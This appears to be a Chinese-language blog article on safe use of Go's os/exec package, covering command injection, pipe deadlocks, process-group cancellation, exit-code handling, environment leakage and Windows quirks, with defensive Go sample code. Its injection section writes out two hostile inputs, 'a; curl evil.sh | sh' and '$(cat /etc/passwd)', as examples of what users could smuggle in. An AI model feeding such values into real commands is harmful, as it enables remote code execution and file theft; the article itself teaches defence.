Go 中执行外部命令的正确姿势

🏷️ Go 语言

把 Go 服务当胶水层去调外部命令，是后端绕不开的活：调 git 同步仓库、调 ffmpeg 转码、调内部 CLI 搬数据、调 iptables 改规则。标准库 os/exec 表面只有几个函数，但它的线上事故密度相当高——命令注入、管道死锁、超时杀不干净、退出码判反、环境变量泄漏，追到底几乎都是对同一件事的误解：它不经过 shell。这篇先把执行模型说清楚，再按事故类型逐个拆。

执行模型：os/exec 不是 system()

C 的 system("ls *.txt") 实际执行的是 /bin/sh -c "ls *.txt"，分词、通配符展开、管道、重定向全由 shell 完成。os/exec 走的是另一条路：exec.Command(name, args...) 只是把程序名和参数组装成一个 argv 数组，Start 时在子进程里直接 execve，中间没有任何解释器。

这一点既是它最重要的安全属性，也是新人困惑的唯一来源：你写下的每个参数都会原封不动地成为 argv 的一个元素，不会被拆开，也不会被展开，你也不需要（更不应该）自己给它加引号。

命令注入：拼字符串的那一刻就已经输了

因为默认不走 shell，os/exec 天生没有注入面。注入是被人主动引入的——通常长这样：

exec.Command("sh", "-c", "tar czf /tmp/out.tgz " + userPath)

一旦有了 sh -c 和字符串拼接，你就把参数边界的解释权交还给了 shell。用户传 a; curl evil.sh | sh 就是远程执行；传 $(cat /etc/passwd) 就是任意文件读取。这里要特别强调两个错误认知：

  • 「加引号就安全了」是错的。 把变量包进单引号只是把攻击面从分号换成单引号——攻击者输入一个单引号就能闭合它。手写 shell 转义在多层嵌套、换行符、locale 差异下几乎不可能做对。
  • 「过滤掉分号和竖线就安全了」也是错的。 shell 的元字符集合远不止这两个，换行、反引号、$()、&、>、大括号展开都能达成目的；黑名单永远漏。

正确的心智模型是：参数走数组，数据永远不参与命令结构的构造。 如果实在必须用 sh -c（比如确实需要管道且不想写两个 Cmd），那么脚本文本必须是写死的常量，外部数据只能通过 环境变量 或 位置参数（sh -c 'cmd "$1"' -- value）传进去，绝不进入脚本文本本身。另外别忘了参数注入：即使不经 shell，用户可控的参数如果以连字符开头，也可能被目标程序当成选项（典型是 --output、--upload-file），所以用户数据前面要加 -- 分隔符，或者校验它不以连字符开头。

五种取输出方式与真正的死锁位置

Run、Output、CombinedOutput 的区别不只是「返不返回输出」，关键差异在谁负责读子进程的管道。理解这一点，才能判断死锁风险到底在哪。

flowchart TB S{"输出量可控且只要最终结果"} S -->|"是"| T{"要区分 stdout 与 stderr"} T -->|"要区分"| O["Output：stdout 全量进内存，stderr 自动进上限缓冲"] T -->|"不必区分"| CO["CombinedOutput：两路合并到同一个缓冲"] S -->|"否，输出很大或很长"| L{"要边跑边处理"} L -->|"要"| PIPE["StdoutPipe 与 StderrPipe，各配一个 goroutine"] L -->|"不要，直接落盘"| R{"要阻塞当前 goroutine"} R -->|"阻塞"| RUN["Run：Stdout 直接指向打开的文件"] R -->|"不阻塞"| SW["Start 之后由专门 goroutine 调 Wait"]
方式谁在读子进程管道输出容量返回时机真实死锁风险
Run你指定的 Stdout/Stderr；为空则接 /dev/null取决于你的 writer子进程退出且拷贝 goroutine 结束低。writer 是 *os.File 时连 goroutine 都不需要
Outputexec 自己；Stderr 为空时自动挂 32 KiB 上限缓冲stdout 全量进内存同上低。不会因为「没读 stderr」而死锁
CombinedOutputexec 自己，两路指向同一个 buffer全量进内存同上低，但两路按字节交错，可能把一行日志劈成两半
Start + Wait同 Run同 RunStart 立即返回，Wait 阻塞忘记 Wait 就留下僵尸进程并泄漏管道 fd
StdoutPipe / StderrPipe你自己流式，内存恒定你读到 EOF 之后再 Wait高：串行读两个管道、或先 Wait 再读

这里纠正两个很常见的说法。第一，「用 Output 时 stderr 没人读会把子进程堵死」不成立：Output 在 Stderr 为 nil 时会替你挂一个只保留首尾、总量 32 KiB 的缓冲，并由独立 goroutine 持续排空管道，这也是 ExitError.Stderr 字段数据的来源——顺带一提，这个字段只有 Output 才会填，用 Run 时它永远是空的。第二，「CombinedOutput 让两个 goroutine 并发写同一个 buffer，会数据竞争」也不成立：exec 发现 Stderr 与 Stdout 是同一个值时，会让子进程的两个 fd 指向同一个管道，父侧只有一个读者。

真正的死锁只发生在你接管管道之后。内核管道缓冲是有限的（Linux 默认 64 KiB），先把 stdout 读到 EOF 再去读 stderr，子进程就会在 stderr 的 write 上阻塞，进而不再产出 stdout，双方互等：

sequenceDiagram participant P as 父进程读取方 participant K as 内核管道缓冲 participant C as 子进程 C->>K: 往 stdout 写数据 P->>K: 读 stdout C->>K: 往 stderr 写数据 Note over K: stderr 侧缓冲被写满，没有读者 C--xK: 下一次写 stderr 阻塞在系统调用里 Note over C: 子进程卡死，stdout 不再产出 P->>K: 继续读 stdout，永远读不到 EOF Note over P: Wait 永不返回，双方互等

另一个同源的错误是先调 Wait 再读管道。Wait 会在进程回收后关闭这些管道，你后续读到的只是缓冲里的残余，看起来像「输出被截断」。文档写得很明确：管道必须全部读完之后再 Wait。

取消与超时：CommandContext 只杀直接子进程

exec.CommandContext 做的事很有限：context 完成时调用 Cmd.Cancel，默认实现是给直接子进程发 Kill。如果子进程是个 shell 脚本、一个 make、或者任何会 fork 的程序，它的孩子不会收到任何信号，会变成孤儿继续跑——最典型的症状就是重试时报「端口已被占用」，因为上一轮的孙进程还攥着监听 socket。

还有一个反复被误解的点：WaitDelay 不是执行超时。它是「取消动作发生之后（或进程已退出之后），留给标准输入输出拷贝收尾的宽限期」，超时就强制关管道并让 Wait 返回 exec.ErrWaitDelay。只设 WaitDelay 而不设 context，命令可以跑到天荒地老。两者是配合关系，不是替代关系。

下面这段是我在生产里实际用的封装：超时、进程组清理、环境白名单、输出限长一次到位。

type limitedWriter struct {
    w io.Writer
    n int64 // 还允许写入的字节数
}

// 超额部分直接丢弃但仍然返回成功，这样子进程不会收到 EPIPE 提前死掉，
// 也不会让 io.Copy 报 ErrShortWrite。
func (l *limitedWriter) Write(p []byte) (int, error) {
    total := len(p)
    if l.n <= 0 {
        return total, nil
    }
    if int64(total) > l.n {
        p = p[:l.n]
    }
    n, err := l.w.Write(p)
    l.n -= int64(n)
    if err != nil {
        return n, err
    }
    return total, nil
}

func runIsolated(parent context.Context, timeout time.Duration,
    name string, args ...string) ([]byte, error) {

    ctx, cancel := context.WithTimeout(parent, timeout)
    defer cancel()

    // 参数以数组传递，全程没有字符串拼接，注入面为零。
    cmd := exec.CommandContext(ctx, name, args...)

    // Env 非 nil 是"完整替换"而不是"追加"：必须把子进程真正需要的变量列全，
    // 否则它自己再 exec 时会因为没有 PATH 而失败。
    cmd.Env = []string{
        "PATH=/usr/local/bin:/usr/bin:/bin",
        "LANG=C.UTF-8",
        "HOME=/tmp",
    }
    cmd.Dir = "/srv/workdir"

    // 让子进程自成进程组，这是能够按组清理孙进程的前提。
    cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

    // 覆盖默认 Cancel：负 PID 表示"整个进程组"。
    // 先 SIGTERM 给一次优雅退出的机会，再兜底 SIGKILL 会更友好，这里从简。
    cmd.Cancel = func() error {
        return syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
    }

    // 取消之后最多再给 3 秒收尾；超了就关管道并返回 ErrWaitDelay，
    // 避免孙进程攥着继承来的 fd 把 Wait 永久挂住。
    cmd.WaitDelay = 3 * time.Second

    var buf bytes.Buffer
    lw := &limitedWriter{w: &buf, n: 4 << 20} // 最多收 4 MiB
    cmd.Stdout = lw
    cmd.Stderr = lw // 同一个值，exec 会复用同一个子进程 fd

    err := cmd.Run()
    return buf.Bytes(), err
}

退出码与错误判读

os/exec 的错误分两大类，混在一起处理是监控告警失真的主要原因：一类是没启动起来（*exec.Error，压根没有退出码），一类是启动了但非零退出（*exec.ExitError，有退出码）。

能 As/Is 出什么含义有退出码吗常见误判
*exec.Error，Is(err, exec.ErrNotFound)PATH 里找不到该程序，或文件不可执行没有当成退出码 127 上报；实际上 127 是 shell 的约定，这里没走 shell
Is(err, exec.ErrDot)程序名解析到了当前目录下的相对路径，Go 1.19 起默认拒绝没有误判成权限问题；正确做法是显式给绝对路径
*exec.ExitError跑完了，退出码非零有，ExitCode()grep 无匹配返回 1、diff 有差异返回 1，都是正常语义，不是故障
ExitError 且 WaitStatus.Signaled()被信号终止（含我们自己发的 SIGKILL）ExitCode() 返回 -1把 -1 当业务退出码写进指标
exec.ErrWaitDelay进程已退出但 I/O 拷贝没收尾，被强制关闭可能同时有报成「命令执行失败」，其实命令本身可能已经成功
ctx.Err() == context.DeadlineExceeded我们自己超时把它杀了通常同时拿到 signal: killed只看 err 文本，把超时报成「程序崩溃」

最后一行是重点：被 SIGKILL 打死的进程，Run 返回的往往只是一个 ExitError，文本是 signal: killed，光看 err 区分不出「它自己崩了」和「我们超时杀的」。可靠的判法是先看 ctx.Err()：

func classify(ctx context.Context, err error) string {
    if err == nil {
        return "ok"
    }
    // 1) 先问 context：被我们杀掉时 err 通常只有 signal: killed，
    //    只有 ctx.Err() 能区分"超时"和"程序自己崩了"。
    if ctxErr := ctx.Err(); ctxErr != nil {
        if errors.Is(ctxErr, context.DeadlineExceeded) {
            return "timeout"
        }
        return "canceled_by_caller"
    }
    // 2) 根本没启动：LookPath 失败、目标不可执行。此时没有退出码。
    var startErr *exec.Error
    if errors.As(err, &startErr) {
        return "not_executable: " + startErr.Name
    }
    // 3) 启动了但非零退出，这才有退出码。
    var exitErr *exec.ExitError
    if errors.As(err, &exitErr) {
        if ws, ok := exitErr.Sys().(syscall.WaitStatus); ok && ws.Signaled() {
            // ExitCode() 在这种情况下是 -1，真实原因在 WaitStatus 里。
            return "signaled: " + ws.Signal().String()
        }
        // ExitError.Stderr 只有 Output() 才会填，Run() 时恒为空。
        return fmt.Sprintf("exit=%d stderr=%q",
            exitErr.ExitCode(), bytes.TrimSpace(exitErr.Stderr))
    }
    // 4) 进程退了但管道没收尾，被 WaitDelay 强关。
    if errors.Is(err, exec.ErrWaitDelay) {
        return "io_not_drained"
    }
    return "other: " + err.Error()
}

环境、工作目录与 PATH 查找

这一节的坑全部来自「零值语义」——你没显式设置的字段，行为往往不是你以为的那样。

Cmd 字段零值语义踩坑点
Env = nil继承父进程全部环境变量把 DB_PASSWORD、云厂商临时凭据一并交给子进程；子进程若打印环境或崩溃转储，就是一次泄漏
Env 非 nil完整替换，不是追加忘了 PATH，子进程内部再 exec 就失败；想「继承再改」用 cmd.Environ()（Go 1.19+）取基线
Env 里有重复 key后出现的生效；Windows 上按大小写不敏感去重以为前面的生效，导致覆盖顺序反了
Dir = ""用父进程当前目录Dir 不影响 LookPath；但相对的可执行文件路径是子进程 chdir 之后解析的，两者基准不同
Stdin = nil接 os.DevNull，子进程立刻读到 EOF以为子进程会等输入；反过来，设了 StdinPipe 不 Close 则子进程永远等
Stdout = nil丢弃排查时什么都看不到，误以为程序没执行
ExtraFiles空；传入时子进程里从 fd 3 开始编号Windows 不支持；fd 编号错位会让子进程读错文件

关于 PATH 查找还有两个版本行为要记住。其一，exec.Command 只有在程序名不含路径分隔符时才调 LookPath；写成 ./tool 就跳过查找，直接交给内核，此时它相对于 Dir 解析。其二，Go 1.19 起 LookPath 拒绝把程序名解析成当前目录下的相对路径（返回 exec.ErrDot），这是为了防止在不可信目录里被同名恶意程序劫持。真要执行当前目录下的东西，自己拼 filepath.Abs。服务启动时用 exec.LookPath 把所有依赖的外部命令预检一遍并 fail-fast，比等到线上第一个请求才发现镜像里没装 ffmpeg 要划算得多。

stdin 喂数据与大输出的内存账

需要向子进程流式写入、同时流式读出的场景（数据转换、压缩管道、按行处理日志），正确写法是三条流各有一个 goroutine，主 goroutine 只负责等它们全部结束再 Wait。

// 流式过滤：stdin 喂数据，stdout 按行回调，stderr 只留尾部。
func streamFilter(ctx context.Context, in io.Reader, onLine func(string)) error {
    cmd := exec.CommandContext(ctx, "jq", "-c", ".items[]")
    cmd.WaitDelay = 2 * time.Second

    stdin, err := cmd.StdinPipe()
    if err != nil {
        return err
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return err
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        return err
    }
    if err := cmd.Start(); err != nil {
        return err // 这里是 *exec.Error（找不到 jq），不是退出码
    }

    var g errgroup.Group
    // 1) 喂 stdin：写完必须 Close，否则子进程一直等 EOF。
    g.Go(func() error {
        defer stdin.Close()
        _, err := io.Copy(stdin, in)
        if errors.Is(err, syscall.EPIPE) {
            return nil // 子进程提前退出属正常，不当错误
        }
        return err
    })
    // 2) 读 stdout：必须与 stderr 并行，串行读就是经典死锁。
    g.Go(func() error {
        sc := bufio.NewScanner(stdout)
        // 默认单行上限 64 KiB，超了报 token too long；按业务放大。
        sc.Buffer(make([]byte, 0, 64<<10), 4<<20)
        for sc.Scan() {
            onLine(sc.Text())
        }
        return sc.Err()
    })
    // 3) 读 stderr：必须读到 EOF 把管道排空，只是把内容截断保留，
    //    千万不要用 io.LimitReader 提前停读，那等于把子进程堵死。
    var tail bytes.Buffer
    g.Go(func() error {
        _, err := io.Copy(&limitedWriter{w: &tail, n: 32 << 10}, stderr)
        return err
    })

    if err := g.Wait(); err != nil {
        _ = cmd.Wait()
        return err
    }
    // Wait 一定在所有管道读完之后调用，顺序反了会截断输出。
    if err := cmd.Wait(); err != nil {
        return fmt.Errorf("jq failed: %w (stderr: %s)", err, tail.String())
    }
    return nil
}

内存这件事要算清楚：Output 和 CombinedOutput 把 stdout 全量读进 bytes.Buffer，而 bytes.Buffer 扩容是成倍 append，峰值可以达到最终大小的两倍左右。子进程输出量不受你控制（比如 git log 全量、find /）时，用这两个函数就是在赌容器内存上限。要么改流式，要么把 Stdout 直接指向 *os.File 落盘——后者还有一个隐藏收益：writer 是 *os.File 时 exec 会把该 fd 直接给子进程，不创建管道、不起拷贝 goroutine，纯内核层转发。

跨平台差异与「干脆别调外部命令」

最后两个现实问题。第一个是 Windows：它的进程创建模型和类 Unix 根本不同，CreateProcess 最终只接受一整条命令行字符串，Go 会按 C 运行时的规则替你把 argv 数组转义拼接回去，目标程序再自己解析。这条链路上任何一环规则不一致，参数边界就会错位。

维度类 UnixWindows
进程创建clone/fork + execve，argv 是真数组CreateProcess，最终只有一条命令行字符串
参数传递内核按数组交付，无二次解析Go 按 C 运行时规则转义，目标程序再解析一次
批处理文件无此概念.bat/.cmd 由 cmd.exe 二次解析，转义规则与 C 运行时不同，需要自己填 SysProcAttr.CmdLine
可执行判定看权限位，不要求扩展名依赖 PATHEXT，历史上还会优先搜当前目录
终止进程树Setpgid + 负 PID 发信号没有进程组信号，要用 Job Object，或退化成调 taskkill 带 /T /F
信号语义SIGTERM 优雅退出、SIGKILL 强杀只有 TerminateProcess（等价强杀）；要发 Ctrl-Break 必须先设 CREATE_NEW_PROCESS_GROUP
环境变量区分大小写不区分大小写，去重规则也因此不同

第二个问题更根本：这个外部命令真的必须调吗？ 每一次 exec 都是一次 fork（在大堆进程里复制页表并非零成本）、一次 syscall.ForkLock 串行化、一次二进制加载，还给你的部署加了一条隐式契约——目标机必须装有某个版本的某个命令。更麻烦的是你得解析人类可读的输出，而那个格式会随版本和 locale 漂移。

你想调的命令纯 Go 替代换掉的收益
ls / findos.ReadDir、filepath.WalkDir不必解析输出，路径含空格与换行也不会出错
curl / wgetnet/http超时、重试、连接复用、证书校验全部可控可观测
tar / gziparchive/tar + compress/gzip流式处理，不落临时文件，不受 GNU/BSD tar 参数差异影响
git（读对象、遍历历史）go-git，详见站内《用 Go 操作 Git 仓库：go-git 的能力与边界》单二进制部署，目标机不需要装 git
jqencoding/json + 结构体类型安全，错误能定位到字段
opensslcrypto/*不再受系统 openssl 版本与 FIPS 策略牵制
sed / awkbufio + strings / regexp行为不随 locale 和 GNU/BSD 实现漂移
ps / netstat直接读 /proc（Linux）字段稳定，不用对着列宽做切分

反过来说，ffmpeg、pandoc、LaTeX 这类本身就是一整套复杂实现的工具，没必要也不可能用 Go 重写，该调就调——但要用上面那套封装：数组传参、进程组隔离、超时与宽限期、输出限长、退出码分类。

❌
最容易踩的坑

以下每一条我都在线上见过：

  • 用 sh -c 拼字符串：一旦有拼接就有注入，加引号和过滤分号都挡不住。必须用 shell 时脚本文本写死，数据走环境变量或位置参数。
  • 用户可控参数以连字符开头：即使不经 shell，也会被目标程序当成选项。用户数据前加 -- 分隔，或校验首字符。
  • 串行读 StdoutPipe 和 StderrPipe：其中一路超过内核管道缓冲（Linux 默认 64 KiB）就双向死锁。两个管道必须两个 goroutine 并行读。
  • 先 Wait 再读管道：Wait 会关掉管道，表现为「输出莫名被截断」。顺序只能是读完再 Wait。
  • Start 之后忘了 Wait：子进程退出后变僵尸占着 PID 和管道 fd，长跑服务最终 fork 失败。Wait 还只能调一次。
  • 以为 CommandContext 会杀掉整棵进程树：默认只杀直接子进程。要 Setpgid + 自定义 Cancel 用负 PID 发信号。
  • 把 WaitDelay 当执行超时：它只是取消后的 I/O 收尾宽限期，不设 context 命令能跑到永远。
  • 设了 Env 却忘了 PATH：Env 是完整替换不是追加，子进程内部再 exec 就会失败。想继承再改用 cmd.Environ()。
  • 让 Env 保持 nil：凭据类环境变量整份交给子进程，是很典型的横向泄漏路径。
  • 把 ExitCode() 返回的 -1 当业务退出码：那代表进程是被信号打死的，真实信号在 WaitStatus 里。
  • 把非零退出一律当故障：grep 无匹配返回 1、diff 有差异返回 1 都是正常语义，要按命令约定解释。
  • 对不受控的大输出用 Output：全量进 bytes.Buffer，扩容峰值约两倍，直接把容器 OOM 掉。改流式或直接落盘。
  • 指望 ExitError.Stderr 里有内容：只有 Output 会填这个字段，Run 和 CombinedOutput 都不会。
  • Windows 上直接调 .bat 并依赖 Go 的转义：cmd.exe 会用另一套规则重新解析，参数边界会错位，必须自己填 SysProcAttr.CmdLine。
